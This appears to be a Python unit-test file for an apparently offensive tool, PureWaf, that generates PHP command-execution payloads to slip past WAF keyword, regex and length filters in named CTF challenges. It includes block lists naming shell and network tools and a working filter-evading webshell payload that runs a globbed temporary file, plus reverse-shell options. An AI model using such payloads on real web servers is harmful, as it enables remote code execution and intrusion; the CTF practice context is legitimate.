import os
import re
import sys
import unittest
from unittest.mock import patch

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, ROOT)

from src import bypass
from src import utils
from src.PureWaf import purewaf


class _FakeLogger:
    def __init__(self):
        self.messages = []

    def info(self, message):
        self.messages.append(str(message))

    def warning(self, message):
        self.messages.append(str(message))

    def error(self, message):
        self.messages.append(str(message))


class ExampleTests(unittest.TestCase):
    def test_hnctf_really_ez_rce(self):
        """
        H&NCTF Really_Ez_Rce
        针对于过滤字符串的使用
        """
        print("\n--- H&NCTF2025 Really_Ez_Rce ---")

        waf_words = "wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|more|cc|tac|less|head|uniq|copy|file|xxd|date|flag|bash|env|ls|id/i"
        waf_chars = "*\\{}%[]!?\'\"."

        result = purewaf(
            waf_words=waf_words,
            waf_chars=waf_chars,
            flagfile="/flag",
            log_level="INFO",
        )
        print(f"Result Payload: {result}")
        self.assertIsNotNone(result)
        self.assertTrue(len(result) > 0)
        print(" ")

    def test_newstar_rce(self):
        """
        [NewStarCTF 2023] R!C!E!
        针对于正则过滤的使用
        """

        print("\n--- [NewStarCTF 2023] R!C!E! ---")

        waf_regex = "/flag|system|pass|cat|ls/i"

        result = purewaf(
            waf_regex=waf_regex,
            flagfile="/flag",
            log_level="INFO",
        )
        print(f"Result Payload: {result}")
        self.assertIsNotNone(result)
        self.assertTrue(len(result) > 0)
        print(" ")

    def test_moectf2025_webshell_revenge(self):
        """
        MoeCTF2025 Webshell_Revenge?
        针对于长度与字符限制的使用
        """

        print("\n--- MoeCTF2025 Webshell Revenge ---")

        waf_regex = "/[A-Za-z0-9_$]/"

        limit_length = 30

        result = purewaf(
            waf_regex=waf_regex,
            limit_length=limit_length,
            read_env=True,
            reflect_shell=False,
            flagfile="/flag",
            log_level="INFO",
        )
        self.assertIsNotNone(result)
        self.assertTrue(len(result) > 0)

        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=True,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0,
        )
        base_payloads = bypass.generate_candidates(options)
        encoded_payloads = bypass.apply_encodings(base_payloads, utils.get_encoding_strategies())
        passed = bypass.filter_payloads(
            encoded_payloads,
            utils.parse_waf_words(""),
            utils.parse_waf_chars(""),
            utils.parse_waf_regex(waf_regex),
            limit_length,
            show_progress=False,
            verbose=False,
        )

        target = "?><?=`. /???/????????[@-[]`;?>"
        self.assertIn(target, passed, f"Target payload not found: {target}")
        self.assertLessEqual(len(target), 30)
        self.assertIsNone(re.search(r"[A-Za-z0-9_$]", target))

        print(f"Result Payload: {result}")
        print(f"Target Payload: {target}")
        print(" ")

    def test_hint_for_bare_payload(self):
        fake_logger = _FakeLogger()

        with (
            patch("src.PureWaf._configure_logger", return_value=(fake_logger, False)),
            patch("src.PureWaf.time.sleep", return_value=None),
            patch("src.PureWaf.bypass.generate_candidates", return_value=["seed"]),
            patch("src.PureWaf.bypass.apply_encodings", side_effect=lambda payloads, _strategies: payloads),
            patch(
                "src.PureWaf.bypass.filter_payloads",
                side_effect=[["root-ok"], [". /???/????????[@-[]"]],
            ),
        ):
            result = purewaf(log_level="INFO")

        output = "\n".join(fake_logger.messages)
        self.assertEqual(result, ". /???/????????[@-[]")
        self.assertIn("Example: ", output)
        self.assertIn("import requests", output)
        self.assertIn('"shell":"?><?=`. /???/????????[@-[]`;?>"', output)
        print(" ")


if __name__ == "__main__":
    unittest.main()
